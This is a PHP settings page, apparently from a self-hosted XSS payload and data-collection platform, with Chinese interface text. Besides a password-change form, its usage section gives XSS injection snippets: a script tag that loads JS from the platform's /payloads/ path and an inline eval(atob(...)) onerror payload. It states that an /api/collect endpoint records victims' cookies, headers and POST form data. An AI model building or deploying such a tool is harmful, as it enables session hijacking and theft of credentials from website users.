<?php
/**
 * 设置页面
 */
require_once 'config.php';
session_start();

if (!isLoggedIn()) {
    header('Location: login.php');
    exit;
}

// 处理密码修改
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_password'])) {
    $oldPassword = $_POST['old_password'] ?? '';
    $newPassword = $_POST['new_password'] ?? '';
    $confirmPassword = $_POST['confirm_password'] ?? '';
    
    if ($newPassword !== $confirmPassword) {
        $error = '两次输入的新密码不一致';
    } elseif (strlen($newPassword) < 6) {
        $error = '新密码长度至少6个字符';
    } else {
        try {
            $pdo = getDbConnection();
            $stmt = $pdo->prepare("SELECT password FROM users WHERE username = ?");
            $stmt->execute([$_SESSION['username']]);
            $user = $stmt->fetch();
            
            if ($user && password_verify($oldPassword, $user['password'])) {
                $newHash = password_hash($newPassword, PASSWORD_DEFAULT);
                $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE username = ?");
                $stmt->execute([$newHash, $_SESSION['username']]);
                $success = '密码修改成功！';
            } else {
                $error = '旧密码不正确';
            }
        } catch (PDOException $e) {
            $error = '操作失败：' . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统设置 - <?php echo APP_NAME; ?></title>
    <link href="static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="static/libs/fontawesome/css/all.min.css">
    <link rel="stylesheet" href="static/css/style.css">
</head>
<body>
    <?php include 'includes/navbar.php'; ?>
    
    <div class="main-content">
        <div class="container-fluid">
            <div class="d-flex justify-content-between align-items-center mb-4 fade-in">
                <h1><i class="fas fa-cog"></i> 系统设置</h1>
            </div>
            
            <?php if (isset($success)): ?>
                <div class="alert alert-success alert-dismissible fade show" role="alert">
                    <i class="fas fa-check-circle"></i> <?php echo $success; ?>
                    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                </div>
            <?php endif; ?>
            
            <?php if (isset($error)): ?>
                <div class="alert alert-danger alert-dismissible fade show" role="alert">
                    <i class="fas fa-exclamation-circle"></i> <?php echo $error; ?>
                    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                </div>
            <?php endif; ?>
            
            <?php if (isAdmin()): ?>
            <!-- 平台信息 -->
            <div class="card shadow fade-in mb-4">
                <div class="card-header">
                    <h5 class="m-0"><i class="fas fa-info-circle"></i> 平台信息</h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <p><strong>平台名称:</strong> <?php echo APP_NAME; ?></p>
                            <p><strong>版本:</strong> <?php echo APP_VERSION; ?></p>
                            <p><strong>当前用户:</strong> <?php echo htmlspecialchars($_SESSION['username']); ?></p>
                            <p><strong>数据库:</strong> <?php echo DB_NAME; ?></p>
                        </div>
                        <div class="col-md-6">
                            <h6 class="text-neon"><i class="fas fa-globe"></i> 访问地址</h6>
                            <div class="mb-3">
                                <label class="form-label">主入口地址:</label>
                                <div class="input-group input-group-sm">
                                    <input type="text" class="form-control" value="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/'; ?>" readonly onclick="this.select()">
                                    <button class="btn btn-outline-secondary" onclick="this.previousElementSibling.select(); document.execCommand('copy'); alert('已复制');"><i class="fas fa-copy"></i></button>
                                </div>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">API接收地址:</label>
                                <div class="input-group input-group-sm">
                                    <input type="text" class="form-control" value="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/api/collect'; ?>" readonly onclick="this.select()">
                                    <button class="btn btn-outline-secondary" onclick="this.previousElementSibling.select(); document.execCommand('copy'); alert('已复制');"><i class="fas fa-copy"></i></button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <?php endif; ?>
            
            <!-- 密码修改 -->
            <div class="card shadow fade-in mb-4">
                <div class="card-header">
                    <h5 class="m-0"><i class="fas fa-key"></i> 修改密码</h5>
                </div>
                <div class="card-body">
                    <form method="POST">
                        <input type="hidden" name="change_password" value="1">
                        <div class="mb-3">
                            <label class="form-label">旧密码:</label>
                            <input type="password" class="form-control" name="old_password" required>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">新密码:</label>
                            <input type="password" class="form-control" name="new_password" required>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">确认新密码:</label>
                            <input type="password" class="form-control" name="confirm_password" required>
                        </div>
                        <button type="submit" class="btn btn-success">
                            <i class="fas fa-save"></i> 保存修改
                        </button>
                    </form>
                </div>
            </div>
            
            <!-- 使用说明 -->
            <div class="card shadow fade-in">
                <div class="card-header">
                    <h5 class="m-0"><i class="fas fa-book"></i> 使用说明</h5>
                </div>
                <div class="card-body">
                    <h6 class="text-neon">1. Payload使用方法</h6>
                    <p>在"Payload管理"中创建JS文件后，可通过以下方式调用：</p>
                    <pre class="bg-dark p-3 rounded"><code>&lt;script src="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/payloads/your_file.js'; ?>"&gt;&lt;/script&gt;</code></pre>
                    
                    <h6 class="text-neon mt-3">2. 内联Payload</h6>
                    <pre class="bg-dark p-3 rounded"><code>&lt;img src=x onerror="eval(atob('YOUR_BASE64_PAYLOAD'))"&gt;</code></pre>
                    
                    <h6 class="text-neon mt-3">3. 数据接收</h6>
                    <p>所有访问和POST请求会自动记录在"日志管理"中，包括：</p>
                    <ul>
                        <li>IP地址、User-Agent、Referer</li>
                        <li>Cookie、请求头</li>
                        <li>POST数据、表单数据</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <?php include 'includes/footer.php'; ?>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>